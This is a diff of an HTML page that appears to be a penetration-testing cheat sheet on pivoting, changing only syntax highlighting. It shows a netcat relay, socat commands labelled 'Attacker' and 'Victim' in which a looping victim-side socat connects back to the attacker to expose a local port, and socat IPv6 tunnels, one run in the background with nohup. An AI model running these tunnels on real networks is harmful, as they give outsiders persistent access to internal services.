@@ -482,26 +482,28 @@ nc 172.17.0.2 9200 &lt; node1 | tee -a in | nc 192.168.56.108 9990 | tee -a out 
 </code></pre></div>
 <h3 id="socat">socat</h3>
 <p>Remote Port Forwarding:</p>
-<div class="highlight"><pre><span></span><code><span class="nx">attacker</span><span class="p">&gt;</span><span class="w"> </span><span class="nx">socat</span><span class="w"> </span><span class="nx">tcp4</span><span class="o">-</span><span class="nx">listen</span><span class="p">:&lt;</span><span class="nx">server</span><span class="w"> </span><span class="nx">port</span><span class="p">&gt;,</span><span class="nx">reuseaddr</span><span class="p">,</span><span class="nx">fork</span><span class="w"> </span><span class="nx">tcp4</span><span class="o">-</span><span class="nx">listen</span><span class="p">:&lt;</span><span class="nx">forward</span><span class="w"> </span><span class="nx">target</span><span class="w"> </span><span class="nx">port</span><span class="p">&gt;,</span><span class="nx">reuseaddr</span>
+<div class="highlight"><pre><span></span><code><span class="c1"># Attacker</span>
+socat<span class="w"> </span>tcp4-listen:&lt;server<span class="w"> </span>port&gt;,reuseaddr,fork<span class="w"> </span>tcp4-listen:&lt;forward<span class="w"> </span>target<span class="w"> </span>port&gt;,reuseaddr
 
-<span class="nx">victim</span><span class="p">&gt;</span><span class="w"> </span><span class="k">while</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span><span class="w"> </span><span class="nx">do</span><span class="w"> </span><span class="nx">socat</span><span class="w"> </span><span class="nx">TCP4</span><span class="p">:&lt;</span><span class="nx">attacker</span><span class="p">&gt;:&lt;</span><span class="nx">server</span><span class="w"> </span><span class="nx">port</span><span class="p">&gt;</span><span class="w"> </span><span class="nx">TCP4</span><span class="p">:</span><span class="m m-Double">127.0.0.1</span><span class="p">:&lt;</span><span class="nx">to</span><span class="w"> </span><span class="nx">forward</span><span class="w"> </span><span class="nx">port</span><span class="p">&gt;</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="nx">done</span>
+<span class="c1"># Victim</span>
+<span class="k">while</span><span class="w"> </span>true<span class="p">;</span><span class="w"> </span><span class="k">do</span><span class="w"> </span>socat<span class="w"> </span>TCP4:&lt;attacker&gt;:&lt;server<span class="w"> </span>port&gt;<span class="w"> </span>TCP4:127.0.0.1:&lt;to<span class="w"> </span>forward<span class="w"> </span>port&gt;<span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="k">done</span>
 </code></pre></div>
 <p>IPV6 Tunneling:</p>
-<div class="highlight"><pre><span></span><code># UDP:
+<div class="highlight"><pre><span></span><code><span class="c1"># UDP:</span>
 
-socat UDP4-LISTEN:5683,fork,su=nobody UDP6:[aaaa::212:4b00:615:a1f7]:5683
+socat<span class="w"> </span>UDP4-LISTEN:5683,fork,su<span class="o">=</span>nobody<span class="w"> </span>UDP6:<span class="o">[</span>aaaa::212:4b00:615:a1f7<span class="o">]</span>:5683
 
-# TCP:
+<span class="c1"># TCP:</span>
 
-socat TCP4-LISTEN:22,fork,su=nobody TCP6:[2a01:198:79d:1::8]:22
+socat<span class="w"> </span>TCP4-LISTEN:22,fork,su<span class="o">=</span>nobody<span class="w"> </span>TCP6:<span class="o">[</span>2a01:198:79d:1::8<span class="o">]</span>:22
 
-# UDP, IPv6
+<span class="c1"># UDP, IPv6</span>
 
-socat UDP6-LISTEN:5683,fork,su=nobody UDP6:[aaaa::212:4b00:615:a1f7]:5683
+socat<span class="w"> </span>UDP6-LISTEN:5683,fork,su<span class="o">=</span>nobody<span class="w"> </span>UDP6:<span class="o">[</span>aaaa::212:4b00:615:a1f7<span class="o">]</span>:5683
 
-# Using in a script:
+<span class="c1"># Using in a script:</span>
 
-nohup socat TCP4-LISTEN:22,fork,su=nobody TCP6:[2a01:198:79d:1::8]:22 &amp;
+nohup<span class="w"> </span>socat<span class="w"> </span>TCP4-LISTEN:22,fork,su<span class="o">=</span>nobody<span class="w"> </span>TCP6:<span class="o">[</span>2a01:198:79d:1::8<span class="o">]</span>:22<span class="w"> </span><span class="p">&amp;</span>
 </code></pre></div>
 <h3 id="ssh">SSH</h3>
 <p>Local Port Forwarding:</p>
